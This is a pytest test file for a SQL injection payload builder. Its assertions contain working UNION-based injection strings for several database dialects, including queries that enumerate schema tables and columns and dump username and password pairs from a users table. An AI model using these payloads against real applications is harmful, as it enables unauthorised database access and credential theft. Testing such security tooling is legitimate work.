"""Tests for union_builder."""

import pytest

from ..union_builder import (
    CONCAT_LIMITS,
    DIALECTS,
    UnionBuilder,
    columns_payload,
    data_payload,
    tables_payload,
)


class TestBasic:
    def test_mysql_single_string_col(self):
        sql = UnionBuilder(3, [1], {1: ["username", "password"]},
                           dialect="mysql", table="users").build()
        assert sql == ("' UNION SELECT CONCAT(username,':-:',password),"
                       "NULL,NULL FROM users-- -")

    def test_postgres_single_string_col(self):
        sql = UnionBuilder(3, [1], {1: ["a", "b"]},
                           dialect="postgres", table="t").build()
        assert "CONCAT(a,':-:',b)" in sql

    def test_oracle_single_string_col(self):
        # Oracle default uses ||, so CONCAT is not expected here
        sql = UnionBuilder(2, [2], {2: ["a", "b"]},
                           dialect="oracle", table="t").build()
        assert "(a || ':-:' || b)" in sql
        assert sql.startswith("' UNION SELECT NULL,")

    def test_oracle_three_parts_uses_pipes(self):
        sql = UnionBuilder(2, [2], {2: ["a", "b", "c"]},
                           dialect="oracle", table="t").build()
        assert "(a || ':-:' || b || ':-:' || c)" in sql
        assert "CONCAT" not in sql

    def test_sqlite_uses_pipes(self):
        sql = UnionBuilder(2, [1], {1: ["a", "b"]},
                           dialect="sqlite", table="t").build()
        assert "(a || ':-:' || b)" in sql

    def test_unknown_dialect_raises(self):
        with pytest.raises(ValueError):
            UnionBuilder(1, [1], {1: ["a"]}, dialect="mongo")

    def test_custom_separator(self):
        sql = UnionBuilder(2, [1], {1: ["a", "b"]},
                           dialect="mysql", sep="|", table="t").build()
        assert "'|'" in sql

    def test_no_table(self):
        sql = UnionBuilder(1, [1], {1: ["a"]},
                           dialect="mysql", table=None).build()
        assert "FROM" not in sql

    def test_where_clause(self):
        sql = UnionBuilder(2, [1], {1: ["a"]},
                           dialect="mysql", table="t",
                           where="id=1").build()
        assert "WHERE id=1" in sql


class TestForceFunc:
    def test_mysql_force_pipes(self):
        with pytest.warns(UserWarning, match="PIPES_AS_CONCAT"):
            sql = UnionBuilder(2, [1], {1: ["a", "b"]},
                               dialect="mysql", force_func=False).build()
        assert "(a || ':-:' || b)" in sql
        assert "CONCAT" not in sql

    def test_oracle_force_concat_warns_and_falls_back(self):
        # Oracle CONCAT() takes 2 arguments. With a separator we get 3+,
        # so the builder warns and uses ||.
        with pytest.warns(UserWarning, match="CONCAT"):
            sql = UnionBuilder(2, [1], {1: ["a", "b"]},
                               dialect="oracle", sep=":-:",
                               force_func=True).build()
        assert "(a || ':-:' || b)" in sql
        assert "CONCAT" not in sql

    def test_oracle_force_concat_with_sep_falls_back_to_pipes(self):
        # With a separator, the argument list becomes [a, sep, b] - three
        # arguments, which Oracle CONCAT() cannot accept. Builder must use ||.
        with pytest.warns(UserWarning, match="CONCAT"):
            sql = UnionBuilder(2, [1], {1: ["a", "b"]},
                               dialect="oracle", sep=":-:",
                               force_func=True).build()
        assert "(a || ':-:' || b)" in sql
        assert "CONCAT" not in sql

    def test_oracle_force_concat_three_parts_still_uses_pipes(self):
        # Even with force_func=True, Oracle cannot take 3+ args in CONCAT,
        # so the builder falls back to ||.
        with pytest.warns(UserWarning, match="CONCAT"):
            sql = UnionBuilder(2, [1], {1: ["a", "b", "c"]},
                               dialect="oracle", force_func=True).build()
        assert "(a || ':-:' || b || ':-:' || c)" in sql

    def test_mysql_force_func_explicit(self):
        sql = UnionBuilder(2, [1], {1: ["a", "b"]},
                           dialect="mysql", force_func=True).build()
        assert "CONCAT(a,':-:',b)" in sql


class TestNullSafe:
    def test_mysql_ifnull(self):
        sql = UnionBuilder(3, [1], {1: ["username", "email"]},
                           dialect="mysql", null_safe=True,
                           null_fn="IFNULL").build()
        assert "IFNULL(username,'')" in sql
        assert "IFNULL(email,'')" in sql

    def test_postgres_coalesce(self):
        sql = UnionBuilder(3, [1], {1: ["username", "email"]},
                           dialect="postgres", null_safe=True).build()
        assert "COALESCE(username,'')" in sql
        assert "COALESCE(email,'')" in sql

    def test_disabled_by_default(self):
        sql = UnionBuilder(3, [1], {1: ["username"]},
                           dialect="mysql").build()
        assert "IFNULL" not in sql
        assert "COALESCE" not in sql


class TestStringCols:
    def test_string_col_without_layout_is_empty_string(self):
        sql = UnionBuilder(3, [1, 2], {1: ["a"]},
                           dialect="mysql").build()
        assert "''" in sql

    def test_numeric_col_is_null(self):
        sql = UnionBuilder(3, [1], {1: ["a"]},
                           dialect="mysql").build()
        assert sql.count("NULL") == 2


class TestPrefix:
    def test_numeric_prefix(self):
        sql = UnionBuilder(1, [1], {1: ["a"]},
                           dialect="mysql", table=None).build(prefix="")
        assert sql.startswith(" UNION SELECT")


class TestPresets:
    def test_tables_payload_mysql(self):
        sql = tables_payload(3, 1, dialect="mysql")
        assert "information_schema.tables" in sql
        assert "table_schema=database()" in sql

    def test_tables_payload_postgres(self):
        sql = tables_payload(3, 1, dialect="postgres")
        assert "current_schema()" in sql

    def test_columns_payload(self):
        sql = columns_payload(3, 1, "users", dialect="mysql")
        assert "information_schema.columns" in sql
        assert "table_name='users'" in sql

    def test_data_payload(self):
        sql = data_payload(3, [1], {1: ["username", "password"]},
                           "users", sep=":-:", dialect="mysql")
        assert "CONCAT(username,':-:',password)" in sql
        assert "FROM users" in sql


class TestDialectCoverage:
    def test_all_dialects_present(self):
        for d in ("mysql", "postgres", "mssql", "oracle", "sqlite"):
            assert d in DIALECTS

    def test_oracle_concat_limit(self):
        assert CONCAT_LIMITS["oracle"] == 2

    def test_all_dialects_build(self):
        for d in DIALECTS:
            sql = UnionBuilder(2, [1], {1: ["a", "b"]},
                               dialect=d, table="t").build()
            assert "UNION SELECT" in sql
            assert sql.endswith("-- -")
